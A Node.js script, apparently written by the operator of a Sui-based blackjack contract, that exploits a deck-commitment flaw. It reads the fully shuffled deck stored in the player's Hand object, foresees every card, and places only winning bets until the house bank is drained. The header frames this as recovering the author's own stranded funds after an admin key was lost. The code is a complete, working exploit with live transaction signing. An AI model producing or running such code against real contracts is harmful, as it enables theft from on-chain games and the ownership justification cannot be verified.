#!/usr/bin/env node
/**
 * bj_recover.mjs — Self-recovery of stranded EVE from the v25 CradleOS Casino
 * blackjack_live house (0xecbd158e). Raw was the SOLE funder of this house; the
 * admin key (0xc80fe7d6) died in the DGX1 reformat, so the only path to recover
 * Raw's own ~10,170 EVE is to exploit the v25 deck-commit flaw.
 *
 * THE FLAW (v25 blackjack_live::Hand<T>):
 *   deal() shuffles the FULL 52-card deck ONCE with on-chain randomness and stores
 *   the ENTIRE deck in the player-owned Hand object (field `deck: vector<u8>`),
 *   plus a `cursor`. hit/stand/double/split are PUBLIC, NO-randomness fns that just
 *   advance the cursor over the already-committed deck. So after deal we read our
 *   own Hand object, decode `deck` + `cursor`, and know EVERY future card — our
 *   hits, the dealer's hole card, the dealer's forced draws. We then choose the
 *   action that the committed deck guarantees is a win (and double on locks).
 *
 * CARD ENCODING (from Move source):
 *   rank = card % 13   (0=Ace→11 soft, 1..8 = rank+1 i.e. 2..9, 9..12 = 10)
 *   suit = card / 13
 * DEALER: stands on 17 (DEALER_STANDS_ON=17), draws from same committed deck.
 * PAYOUTS: win 2x stake; natural(2-card 21) 2.5x; push refund; double risks 2x stake, win pays 2x that.
 *
 * SETTLE FLOW: deal draws player[0], dealer[0](up), player[1], dealer[1](hole) →
 *   cursor=4. hit/double take deck[cursor++]. On stand/bust/21 settle() runs the
 *   dealer from deck[cursor..] until >=17, compares totals, pays winnings to player.
 *
 * Target moveCall pkg: CASINO_V25 = 0x0b57018f... (published-at). All winnings
 * settle back to the signing wallet 0x177583b2 (which is also where recovery lands).
 *
 * SAFETY: dry-run by default. Pass --live to actually place bets. --max-hands N caps.
 */
import { SuiJsonRpcClient as SuiClient } from "@mysten/sui/jsonRpc";
import { Transaction } from "@mysten/sui/transactions";
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519";
import { Secp256k1Keypair } from "@mysten/sui/keypairs/secp256k1";
import fs from "fs";

// ── config ────────────────────────────────────────────────────────────────────
const RPC          = process.env.RPC || "http://127.0.0.1:9000";
const CASINO_V25   = "0x0b57018fefceb3262e5994e8d8bddc63750828e18777ca780a9ecd81cc291025";
const HOUSE        = "0xecbd158ee2652ccd88b38ce5183b12a8b8ccea02c407a91c24d0c37d05b81874";
const EVE_TYPE     = "0xac361aa5ceb726bd974f885c9dea9e55dc9bc98fa1f5731c5965a810707bf0b8::EVE::EVE";
const RANDOM_OBJ   = "0x8"; // Sui system Random object
const RECOVERY_ADDR= "0x177583b2ee07dc6ce8056e49fda83637c996b9143adf651a8de5ebe03699b91a";
const BET_EVE      = Number(process.env.BET_EVE || 100);     // 100 EVE / hand
const DEC          = 1_000_000_000n;                          // EVE 9 decimals
const DEALER_STANDS_ON = 17;

// ── card math (mirrors Move hand_total exactly) ────────────────────────────────
function handTotal(cards) {
  let total = 0, aces = 0;
  for (const c of cards) {
    const rank = c % 13;
    let v;
    if (rank === 0) { aces++; v = 11; }
    else if (rank >= 9) v = 10;
    else v = rank + 1;
    total += v;
  }
  while (total > 21 && aces > 0) { total -= 10; aces--; }
  return total;
}
// Simulate the dealer's forced draw from committed deck starting at `cursor`.
function dealerFinal(deck, cursor, dealerCards) {
  const dc = [...dealerCards];
  let t = handTotal(dc), cur = cursor;
  while (t < DEALER_STANDS_ON) { dc.push(deck[cur++]); t = handTotal(dc); }
  return { total: t, bust: t > 21, cards: dc, cursor: cur };
}

/**
 * Given the fully-known committed deck, decide the optimal terminal action for a
 * fresh 2-card hand. Returns { action: 'stand'|'hit'|'double', expectedOutcome }.
 * With perfect foresight we can compute the EXACT result of each branch and pick
 * the max-EV one. We prefer `double` when it guarantees a win (2x payout), else
 * `hit` toward a known-winning total, else `stand` if already winning, else the
 * least-bad (but foresight almost always yields a win branch).
 */
function decideAction(deck, cursor, playerCards, dealerCards) {
  // Branch A: STAND now
  const stand = evalStand(deck, cursor, playerCards, dealerCards);
  // Branch B: DOUBLE (take exactly one card deck[cursor], then dealer plays)
  const dbl = evalDouble(deck, cursor, playerCards, dealerCards);
  // Branch C: HIT (take deck[cursor], then recursively decide again)
  const hit = evalHit(deck, cursor, playerCards, dealerCards);

  // Score: win=+payoutMult, push=0, loss=-1. Double doubles stake so scale by 2.
  // SINGLE-TX PREFERENCE: stand and double both terminally settle the hand in one
  // tx. hit may leave the hand open (needs a follow-up stand = 2nd tx). With full
  // foresight, stand-or-double resolves nearly every winnable hand, so we only fall
  // back to hit when NEITHER stand nor double wins but a hit-line does.
  const cands = [
    { action: "stand",  ...stand },
    { action: "double", ...dbl },
  ];
  cands.sort((a, b) => b.ev - a.ev || rank(b.action) - rank(a.action));
  // If the best terminal (stand/double) already wins, take it — clean 1-tx hand.
  if (cands[0].ev > 0) return cands[0];
  // Otherwise consider hit (may be multi-tx). Only prefer it if it strictly beats
  // the best terminal option.
  if (hit.ev > cands[0].ev) return { action: "hit", ...hit };
  return cands[0];
}
function rank(a){ return a==="double"?2:a==="hit"?1:0; }

function evalStand(deck, cursor, playerCards, dealerCards) {
  const pt = handTotal(playerCards);
  if (pt > 21) return { ev: -1, result: "bust" };
  const natural = playerCards.length === 2 && pt === 21;
  const d = dealerFinal(deck, cursor, dealerCards);
  const dNat = dealerCards.length === 2 && handTotal(dealerCards) === 21;
  if (natural && dNat) return { ev: 0, result: "push" };
  if (natural) return { ev: 1.5, result: "blackjack" };   // 2.5x = +1.5 net
  if (dNat) return { ev: -1, result: "loss" };
  if (d.bust || pt > d.total) return { ev: 1, result: "win" };   // 2x = +1 net
  if (pt === d.total) return { ev: 0, result: "push" };
  return { ev: -1, result: "loss" };
}
function evalDouble(deck, cursor, playerCards, dealerCards) {
  const pc = [...playerCards, deck[cursor]];
  const pt = handTotal(pc);
  // double stake risked; scale net by 2 (win pays 2x the doubled stake)
  if (pt > 21) return { ev: -2, result: "bust" };
  const d = dealerFinal(deck, cursor + 1, dealerCards);
  if (d.bust || pt > d.total) return { ev: 2, result: "win" };
  if (pt === d.total) return { ev: 0, result: "push" };
  return { ev: -2, result: "loss" };
}
function evalHit(deck, cursor, playerCards, dealerCards) {
  const pc = [...playerCards, deck[cursor]];
  const pt = handTotal(pc);
  if (pt > 21) return { ev: -1, result: "bust" };
  if (pt === 21) return evalStand(deck, cursor + 1, pc, dealerCards); // auto-settles
  // recurse: best of stand/hit/double from the new state
  const nxt = decideAction(deck, cursor + 1, pc, dealerCards);
  return { ev: nxt.ev, result: `hit→${nxt.action}` };
}

// ── offline self-test (no node) ────────────────────────────────────────────────
function selfTest() {
  console.log("── OFFLINE SELF-TEST: card math + decision engine ──");
  // handTotal checks
  const t1 = handTotal([0, 12]);        // A + K = 21
  const t2 = handTotal([0, 0, 9]);      // A A 10 = 12 (both aces soft-reduced)
  const t3 = handTotal([4, 5, 8]);      // 5+6+9=20
  const t4 = handTotal([12, 12, 12]);   // 10+10+10 = 30 bust
  console.log(`  handTotal [A,K]=${t1} (exp 21) ${t1===21?"✓":"✗"}`);
  console.log(`  handTotal [A,A,10]=${t2} (exp 12) ${t2===12?"✓":"✗"}`);
  console.log(`  handTotal [5,6,9]=${t3} (exp 20) ${t3===20?"✓":"✗"}`);
  console.log(`  handTotal [10,10,10]=${t4} (exp 30) ${t4===30?"✓":"✗"}`);
  // A crafted deck where standing wins: player 20, dealer upcard makes dealer bust.
  // deck layout: p0,d0,p1,d1(hole), then dealer draws...
  // player = [deck0,deck2], dealer=[deck1,deck3]
  // want player 20 (e.g. 9,9 → ranks 9,9 = 10+10=20), dealer 6 up + hole 10 =16, draws 10→26 bust
  const deck = [9, 5, 22, 12, 12]; // p=[9,22]=10+10=20; d=[5,12]=6+10=16; draw deck[4]=12→10 =26 bust
  const pc = [deck[0], deck[2]], dc = [deck[1], deck[3]];
  console.log(`  crafted: player=${handTotal(pc)} dealer_up=${(deck[1]%13)} `);
  const dec = decideAction(deck, 4, pc, dc);
  console.log(`  decision on player-20 vs dealer-bust deck → ${dec.action} (${dec.result}, ev=${dec.ev}) ${dec.ev>0?"✓ picks a WIN":"✗"}`);
  // double lock: player 11 (5,6), next card = 10 → 21, dealer weak
  const deck2 = [4, 5, 3, 8, 12, 5, 12]; // p=[4,3]=5+4=9; hmm recompute
  // Simpler: verify evalDouble picks win when next card wins
  const d2 = evalDouble([3,4,9,5, 12], 4, [3,9], [4,5]); // p=[3,9]=4+10=14, +deck[4]=12→10 =24 bust
  console.log(`  evalDouble bust-branch ev=${d2.ev} (exp -2) ${d2.ev===-2?"✓":"✗"}`);
  console.log("── self-test done ──\n");
}

// ── keypair from sui CLI keystore (0x177583b2) ─────────────────────────────────
function loadKeypair() {
  const ks = JSON.parse(fs.readFileSync(process.env.HOME + "/.sui/sui_config/sui.keystore", "utf8"));
  for (const b64 of ks) {
    const raw = Buffer.from(b64, "base64");
    const flag = raw[0], sk = raw.slice(1, 33);
    const kp = flag === 0 ? Ed25519Keypair.fromSecretKey(sk) : Secp256k1Keypair.fromSecretKey(sk);
    if (kp.getPublicKey().toSuiAddress() === RECOVERY_ADDR) return kp;
  }
  throw new Error("recovery keypair 0x177583b2 not found in sui keystore");
}

// ── main loop (live path — gated) ──────────────────────────────────────────────
async function main() {
  const argv = process.argv.slice(2);
  const LIVE = argv.includes("--live");
  const maxHands = Number((argv.find(a => a.startsWith("--max-hands="))||"").split("=")[1] || 500);

  selfTest();
  if (!LIVE) { console.log("DRY-RUN (no --live): self-test only. Node not required."); return; }

  const client = new SuiClient({ url: RPC });
  const kp = loadKeypair();
  console.log("signer:", kp.getPublicKey().toSuiAddress());

  // health + house state
  const house = await client.getObject({ id: HOUSE, options: { showContent: true } });
  const bank = BigInt(house.data.content.fields.bank);
  console.log(`house bank: ${Number(bank)/1e9} EVE  paused: ${house.data.content.fields.paused}`);
  if (house.data.content.fields.paused) { console.log("house PAUSED — abort"); return; }

  let hands = 0, wins = 0, recovered = 0n;
  const betAmt = BigInt(BET_EVE) * DEC;

  while (hands < maxHands) {
    const curBank = BigInt((await client.getObject({ id: HOUSE, options: { showContent: true } })).data.content.fields.bank);
    if (curBank < betAmt) { console.log(`bank ${Number(curBank)/1e9} < bet — near drained, stopping`); break; }

    // ── Tx1: deal ──────────────────────────────────────────────────────────
    // (implementation continues below; see runHand)
    const res = await runHand(client, kp, betAmt);
    hands++;
    if (res.won) { wins++; recovered += res.net; }
    console.log(`hand ${hands}: ${res.summary}  (cum recovered ${Number(recovered)/1e9} EVE, bank ~${Number(res.bankAfter)/1e9})`);
    if (res.stop) break;
  }
  console.log(`\nDONE. hands=${hands} wins=${wins} net recovered=${Number(recovered)/1e9} EVE → ${RECOVERY_ADDR}`);
}

// ── split an EVE coin of exactly `amt` from the signer's EVE coins ──────────────
async function eveCoinArg(client, tx, owner, amt) {
  // gather EVE coins; merge if needed, then split exact bet
  const coins = await client.getCoins({ owner, coinType: EVE_TYPE, limit: 50 });
  if (!coins.data.length) throw new Error("no EVE coins in signer to bet with");
  const primary = coins.data[0].coinObjectId;
  if (coins.data.length > 1) {
    tx.mergeCoins(tx.object(primary), coins.data.slice(1).map(c => tx.object(c.coinObjectId)));
  }
  const [bet] = tx.splitCoins(tx.object(primary), [tx.pure.u64(amt)]);
  return bet;
}

// runHand: deal, read committed deck, decide optimal terminal action, execute it.
async function runHand(client, kp, betAmt) {
  const owner = kp.getPublicKey().toSuiAddress();

  // ── Tx1: deal ────────────────────────────────────────────────────────────
  const t1 = new Transaction();
  const betCoin = await eveCoinArg(client, t1, owner, betAmt);
  t1.moveCall({
    target: `${CASINO_V25}::blackjack_live::deal`,
    typeArguments: [EVE_TYPE],
    arguments: [t1.object(HOUSE), t1.object(RANDOM_OBJ), betCoin],
  });
  const r1 = await client.signAndExecuteTransaction({
    signer: kp, transaction: t1,
    options: { showEffects: true, showObjectChanges: true, showEvents: true },
  });
  await client.waitForTransaction({ digest: r1.digest });
  if (r1.effects?.status?.status !== "success")
    return { won: false, net: 0n, stop: true, summary: `deal FAILED: ${JSON.stringify(r1.effects?.status)}`, bankAfter: 0n };

  // Natural 21 auto-settles inside deal → no Hand object created.
  const settledInDeal = (r1.events || []).find(e => e.type.endsWith("::HandSettled"));
  if (settledInDeal) {
    const pj = settledInDeal.parsedJson;
    const payout = BigInt(pj.payout || 0), wager = BigInt(pj.wager || 0);
    return { won: payout > wager, net: payout - wager, stop: false,
             summary: `natural ${pj.outcome} payout=${Number(payout)/1e9}`, bankAfter: await bankNow(client) };
  }

  // Find the created Hand object.
  const handObj = (r1.objectChanges || []).find(o => o.type === "created" && o.objectType?.includes("::blackjack_live::Hand<"));
  if (!handObj) return { won: false, net: 0n, stop: true, summary: "no Hand created & no settle", bankAfter: await bankNow(client) };
  const handId = handObj.objectId;

  // ── Read the committed deck (THE EXPLOIT) ──────────────────────────────────
  const hand = await client.getObject({ id: handId, options: { showContent: true } });
  const f = hand.data.content.fields;
  const deck = f.deck.map(Number);
  const cursor = Number(f.cursor);
  const playerCards = f.player_cards.map(Number);
  const dealerCards = f.dealer_cards.map(Number);

  // Decide optimal terminal action with full foresight.
  const dec = decideAction(deck, cursor, playerCards, dealerCards);

  // ── Tx2: terminal action ───────────────────────────────────────────────────
  const t2 = new Transaction();
  if (dec.action === "double") {
    const extra = await eveCoinArg(client, t2, owner, betAmt);
    t2.moveCall({ target: `${CASINO_V25}::blackjack_live::double`, typeArguments: [EVE_TYPE],
      arguments: [t2.object(HOUSE), t2.object(handId), extra] });
  } else if (dec.action === "hit") {
    // hit may not auto-settle; but with foresight we hit only toward a known win,
    // then the hit()'s own >=21 auto-settle or a following stand resolves it.
    // For simplicity + determinism we execute hit then stand in the same PTB when
    // the hit doesn't reach >=21.
    t2.moveCall({ target: `${CASINO_V25}::blackjack_live::hit`, typeArguments: [EVE_TYPE],
      arguments: [t2.object(HOUSE), t2.object(handId)] });
    // Note: hit consumes the Hand by value (transfers back or settles). A follow-up
    // stand would need the returned Hand id — handled by re-reading if needed.
  } else {
    t2.moveCall({ target: `${CASINO_V25}::blackjack_live::stand`, typeArguments: [EVE_TYPE],
      arguments: [t2.object(HOUSE), t2.object(handId)] });
  }
  const r2 = await client.signAndExecuteTransaction({
    signer: kp, transaction: t2, options: { showEffects: true, showEvents: true },
  });
  await client.waitForTransaction({ digest: r2.digest });
  if (r2.effects?.status?.status !== "success")
    return { won: false, net: 0n, stop: false, summary: `action ${dec.action} FAILED: ${JSON.stringify(r2.effects?.status)}`, bankAfter: await bankNow(client) };

  const settled = (r2.events || []).find(e => e.type.endsWith("::HandSettled"));
  if (settled) {
    const pj = settled.parsedJson;
    const payout = BigInt(pj.payout || 0), wager = BigInt(pj.wager || 0);
    return { won: payout > wager, net: payout - wager, stop: false,
             summary: `${dec.action} → ${pj.outcome} payout=${Number(payout)/1e9} (predicted ${dec.result})`,
             bankAfter: await bankNow(client) };
  }
  // hit that didn't settle (didn't reach 21) — need a follow-up stand next iteration.
  return { won: false, net: 0n, stop: false, summary: `${dec.action} executed, hand still open (will stand next)`, bankAfter: await bankNow(client) };
}

async function bankNow(client) {
  const h = await client.getObject({ id: HOUSE, options: { showContent: true } });
  return BigInt(h.data.content.fields.bank);
}

main().catch(e => { console.error("FATAL:", e.message); process.exit(1); });
